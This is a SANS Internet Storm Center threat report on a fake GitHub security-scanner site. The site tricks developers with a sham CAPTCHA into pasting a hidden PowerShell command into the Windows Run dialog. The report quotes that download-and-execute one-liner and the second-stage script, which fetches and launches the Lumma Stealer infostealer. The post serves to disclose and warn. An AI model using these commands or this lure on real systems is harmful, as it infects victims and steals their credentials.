---
title: Fake GitHub Site Targeting Developers, (Thu, Sep 19th)
url: https://isc.sans.edu/diary/rss/31282
source: SANS Internet Storm Center, InfoCON: green
date: 2024-09-20
fetch_date: 2025-10-06T18:30:42.892776
---

# Fake GitHub Site Targeting Developers, (Thu, Sep 19th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31278)
* [next](/diary/31288)

My next class:

|  |  |  |
| --- | --- | --- |
| [Application Security: Securing Web Apps, APIs, and Microservices](https://www.sans.org/event/dallas-2025/course/application-security-securing-web-apps-api-microservices) | Dallas | Dec 1st - Dec 6th 2025 |

# [Fake GitHub Site Targeting Developers](/forums/diary/Fake%2BGitHub%2BSite%2BTargeting%2BDevelopers/31282/)

**Published**: 2024-09-19. **Last Updated**: 2024-09-19 20:14:39 UTC
**by** [Johannes Ullrich](https://plus.google.com/101587262224166552564?rel=author) (Version: 1)

[1 comment(s)](/diary/Fake%2BGitHub%2BSite%2BTargeting%2BDevelopers/31282/#comments)

Our reader "RoseSecurity" forwarded received the following malicious email:

> Hey there!
>
> We have detected a security vulnerability in your repository. Please contact us at https:[//]github-scanner[.]com  to get more information on how to fix this issue.
>
> Best regards,
> Github Security Team

GitHub has offered free security scans to users for a while now. But usually, you go directly to GitHub.com to review results, not a "scanner" site like suggested above.

The github-scanner website first displays what appears to be some form of Captcha to make sure you are "Human" (does this exclude developers?)

![](https://isc.sans.edu/diaryimages/images/Screenshot%202024-09-19%20at%203_54_01%E2%80%AFPM.png)

Clicking on "I'm not a robot" leads to this challenge screen:

![](https://isc.sans.edu/diaryimages/images/Screenshot%202024-09-19%20at%204_03_02%E2%80%AFPM.png)

Not your normal Captcha! So what is going on?

JavaScript on the website copied an exploit string into the user's clipboard. The "Windows"+R sequence opens the Windows run dialog, and the victim is enticed to execute the code. The script:

> powershell.exe -w hidden -Command "iex (iwr 'https://github-scanner[.]com/download.txt').Content" # "? ''I am not a robot - reCAPTCHA Verification ID: 93752"

This simple and effective script will download and execute the "download.txt" script. The victim will likely never see the script. Due to the size of the run dialog, the victim will only see the last part of the string above, which may appear perfectly reasonable given that the victim is supposed to prove that they are human

download.txt contains:

> $webClient = New-Object System.Net.WebClient
> $url1 = "https:// github-scanner [.]com/l6E.exe"
> $filePath1 = "$env:TEMP\SysSetup.exe"
> $webClient.DownloadFile($url1, $filePath1)
> Start-Process -FilePath  $env:TEMP\SysSetup.exe

This will download "l6E.exe" and save it as "SysSetup.exe". Luckily, l6E.exe has pretty good anti-virus coverage. On my test system, Microsoft Defender immediately recognized it [1] . It is identified as "Lumma Stealer", an information stealer. The domain is recognized by some anti-malware, but sadly not yet on Google's safe browsing blocklist.

Yes another case of Infostealers going after developers!

[1] https://www.virustotal.com/gui/file/d737637ee5f121d11a6f3295bf0d51b06218812b5ec04fe9ea484921e905a207

---
Johannes B. Ullrich, Ph.D. , Dean of Research, [SANS.edu](https://sans.edu)
[Twitter](https://jbu.me/164)|

Keywords:

[1 comment(s)](/diary/Fake%2BGitHub%2BSite%2BTargeting%2BDevelopers/31282/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Application Security: Securing Web Apps, APIs, and Microservices](https://www.sans.org/event/dallas-2025/course/application-security-securing-web-apps-api-microservices) | Dallas | Dec 1st - Dec 6th 2025 |

* [previous](/diary/31278)
* [next](/diary/31288)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)